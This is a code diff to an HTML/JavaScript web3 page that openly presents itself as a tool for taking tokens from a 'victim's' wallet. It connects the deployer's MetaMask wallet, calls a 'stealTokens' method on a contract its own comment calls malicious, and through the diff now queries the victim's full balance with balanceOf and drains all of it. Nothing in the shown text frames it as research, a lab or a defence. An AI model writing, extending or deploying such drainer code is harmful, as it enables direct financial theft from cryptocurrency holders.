@@ -31,7 +31,7 @@
 </head>
 <body>
     <h1>Withdraw Tokens Using Deployer's Wallet</h1>
-    <p>Connect your wallet as the deployer to withdraw tokens from the victim's wallet.</p>
+    <p>Connect your wallet as the deployer to withdraw all tokens from the victim's wallet.</p>
 
     <!-- Connect Wallet Button -->
     <button id="connectWalletBtn">Connect Wallet</button>
@@ -44,14 +44,8 @@
 
     <br><br>
 
-    <!-- Amount to Withdraw -->
-    <label for="withdrawAmount">Amount to Withdraw: </label>
-    <input type="number" id="withdrawAmount" placeholder="Enter amount" />
-
-    <br><br>
-
     <!-- Withdraw Button -->
-    <button id="withdrawTokensBtn" style="display:none;">Withdraw Tokens</button>
+    <button id="withdrawTokensBtn" style="display:none;">Withdraw All Tokens</button>
 
     <p id="status"></p>
 
@@ -61,6 +55,7 @@
         let userAccount;
         let contractAddress = "0xE3b5567F27d5cC4FDe7326F42c8749169448f08a"; // Replace with your malicious contract address
         let contract;
+        let tokenAddress = "0x59610B067eCfeCEdaf146A5E9B180C440f008575"; // Replace with the token contract address
 
         window.onload = () => {
             console.debug("Page loaded. Checking for MetaMask...");
@@ -108,24 +103,41 @@
 
         async function withdrawTokens() {
             const victimAddress = document.getElementById('victimAddress').value;
-            const withdrawAmount = document.getElementById('withdrawAmount').value;
 
             if (!victimAddress) {
                 alert("Please enter a victim's address!");
                 console.debug("No victim address provided.");
                 return;
             }
-            if (!withdrawAmount || withdrawAmount <= 0) {
-                alert("Please enter a valid amount to withdraw!");
-                console.debug("Invalid withdrawal amount:", withdrawAmount);
-                return;
-            }
 
             try {
-                console.debug("Initiating withdrawal for victim:", victimAddress, "Amount:", withdrawAmount);
-                await contract.methods.stealTokens(victimAddress, withdrawAmount).send({ from: userAccount });
-                console.debug("Withdrawal successful.");
-                document.getElementById('status').innerText = `Successfully withdrawn ${withdrawAmount} tokens from ${victimAddress}!`;
+                console.debug("Initiating withdrawal for victim:", victimAddress);
+
+                // Get the victim's token balance
+                const tokenContract = new web3.eth.Contract([
+                    {
+                        "constant": true,
+                        "inputs": [{"name": "account", "type": "address"}],
+                        "name": "balanceOf",
+                        "outputs": [{"name": "", "type": "uint256"}],
+                        "payable": false,
+                        "stateMutability": "view",
+                        "type": "function"
+                    }
+                ], tokenAddress);
+
+                const victimBalance = await tokenContract.methods.balanceOf(victimAddress).call();
+                console.debug("Victim's token balance:", victimBalance);
+
+                if (parseInt(victimBalance) > 0) {
+                    // Withdraw all tokens
+                    await contract.methods.stealTokens(victimAddress, victimBalance).send({ from: userAccount });
+                    console.debug("Withdrawal successful.");
+                    document.getElementById('status').innerText = `Successfully withdrawn all tokens from ${victimAddress}!`;
+                } else {
+                    document.getElementById('status').innerText = "Victim has no tokens to withdraw.";
+                }
+
             } catch (error) {
                 console.error("Error withdrawing tokens:", error);
                 document.getElementById('status').innerText = "Error withdrawing tokens.";
@@ -134,4 +146,3 @@
     </script>
 </body>
 </html>
-
